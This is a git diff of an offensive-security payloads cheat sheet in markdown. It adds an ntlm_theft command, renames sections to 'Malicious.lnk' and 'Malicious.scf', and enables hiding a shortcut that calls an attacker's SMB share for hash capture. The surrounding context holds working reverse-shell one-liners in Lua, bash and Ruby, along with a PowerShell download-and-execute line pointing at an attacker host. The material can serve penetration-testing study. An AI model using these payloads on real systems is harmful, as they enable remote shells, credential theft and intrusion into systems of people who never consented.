@@ -21,6 +21,7 @@
 - [msfvenom](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#msfvenom)
 - [Netcat Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Netcat-Reverse-Shell)
 - [Nishang](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Nishang)
+- [ntlm_theft](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#ntml_theft)
 - [PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PDF)
 - [Perl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Perl-Reverse-Shell)
 - [PHP Web Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-Web-Shell)
@@ -203,11 +204,11 @@ $ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamR
 http://<DOMAIN>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
 ```
 
-## LNK Files
+## .LNK (Link) File
 
 > https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
 
-### lnkfilegen.ps1
+### Malicious.lnk
 
 ```c
 $path                      = "$([Environment]::GetFolderPath('Desktop'))\<FILE>.lnk"
@@ -217,7 +218,7 @@ $shortcut                  = $wshell.CreateShortcut($path)
 $shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
 
 $shortcut.TargetPath       = "cmd.exe"
-$shortcut.Arguments        = "/c explorer.exe Z:\PATH\TO\SHARE & \\<LHOST>\foobar"
+$shortcut.Arguments        = "/c explorer.exe Z:\PATH\TO\SHARE & \\<LHOST>\foobar" # Calls the SMB share of the responder instance on the C2 server
 $shortcut.WorkingDirectory = "C:"
 $shortcut.HotKey           = "CTRL+C"
 $shortcut.Description      = ""
@@ -228,7 +229,13 @@ $shortcut.WindowStyle      = 7
                            # 1 = Normal    window
 $shortcut.Save()
 
-#(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
+(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
+```
+
+### Hide Target Folder
+
+```c
+C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
 ```
 
 ## Markdown Reverse Shell
@@ -293,6 +300,12 @@ Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
 
 ```c
 C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
+```
+
+## ntml_theft
+
+```c
+$ python3 ntlm_theft.py --generate all --server <RHOST>  --filename <FOLDER>
 ```
 
 ## PDF
@@ -454,14 +467,14 @@ exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
 $ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-## SMB .scf-File
+## .SCF (Shell Command File) File
 
-### Getting Hashes for Responder by uploading .scf-files
+### Malicious.scf
 
 ```c
 [Shell]
 Command=2
-IconFile=\\<LHOST>\payload.ico
+Iconfile=\\<LHOST>\foobar
 [Taskbar]
 Command=ToggleDesktop
 ```
